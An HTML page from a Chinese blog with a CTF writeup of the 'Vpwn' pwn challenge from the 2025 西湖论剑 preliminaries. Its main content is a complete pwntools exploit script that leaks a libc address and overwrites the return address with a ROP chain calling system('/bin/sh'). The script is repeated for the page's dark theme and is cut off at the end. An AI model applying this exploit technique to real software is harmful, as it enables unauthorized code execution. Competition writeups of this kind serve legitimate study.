<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>西湖论剑 2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="2025西湖论剑初赛 Pwn 题解"/><meta property="og:title" content="西湖论剑 2025 Writeup | 花盆"/><meta property="og:description" content="2025西湖论剑初赛 Pwn 题解"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/xihulunjian2025-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="2025-pwn" class="scroll-target"><a href="#2025-pwn"><code class="hash inline-code">#</code>2025西湖论剑初赛 Pwn 题解</a></h1>
<p>人生第一次打西湖论剑，虽然是跟着 401 的师傅只看了看题，但是感觉还是有一点收获的。</p>
<p>赛后复现 ak 了本场，在这里记录一下。</p>
<h2 id="vpwn" class="scroll-target"><a href="#vpwn"><code class="hash inline-code">#</code>Vpwn</a></h2>
<p>比较简单的栈虚拟机，逆向无难度，给了任意栈地址读写原语，先泄漏 libc 然后修改返回地址即可。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./Vpwn_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    decompiler connect ida --host localhost --port 3662</span><br><span style="color:#B56959">    breakrva 0x17d0</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter your choice: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">op</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> edit</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34"> value</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter the index to edit (0-based): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter the new value: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">value</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> push</span><span style="color:#2993a3">(</span><span style="color:#393A34">value</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter the value to push: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">value</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pop</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">StackVector contents: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#998418">int</span><span style="color:#1e754f">(</span><span style="color:#393A34">key</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#1e754f">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> key </span><span style="color:#1E754F">in</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B"> \n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B5695977"> "</span><span style="color:#1e754f">)</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> res</span><br><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    push</span><span style="color:#2993a3">(</span><span style="color:#393A34">i </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">push</span><span style="color:#2993a3">(</span><span style="color:#2F798A">30</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># push(11)</span><br><span style="color:#A0ADA0"># pop()</span><br><span style="color:#393A34">res </span><span style="color:#999999">=</span><span style="color:#393A34"> show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io.recvuntil()</span><br><span style="color:#A0ADA0"># print(res)</span><br><span style="color:#393A34">libc_start_main </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">res</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">19</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#998418"> hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">res</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">18</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_base </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_start_main </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">29d90</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_start_main => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_start_main</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">libc_base => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002a3e5</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000f8c92</span><br><span style="color:#393A34">edit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">18</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">edit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">edit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">21</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">edit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">22</span><span style="color:#999999">,</span><span style="color:#393A34"> ret </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">edit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">23</span><span style="color:#999999">,</span><span style="color:#393A34"> ret </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">edit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">24</span><span style="color:#999999">,</span><span style="color:#393A34"> system </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">edit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">25</span><span style="color:#999999">,</span><span style="color:#393A34"> system </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./Vpwn_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    decompiler connect ida --host localhost --port 3662</span><br><span style="color:#C98A7D">    breakrva 0x17d0</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter your choice: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> edit</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> value</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter the index to edit (0-based): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter the new value: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> push</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter the value to push: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> pop</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">StackVector contents: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#B8A965">int</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">key</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#4d9375">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> key </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076"> \n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D77"> "</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> res</span><br><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    push</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">push</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">30</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># push(11)</span><br><span style="color:#758575DD"># pop()</span><br><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># io.recvuntil()</span><br><span style="color:#758575DD"># print(res)</span><br><span style="color:#DBD7CAEE">libc_start_main </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">19</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">18</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span 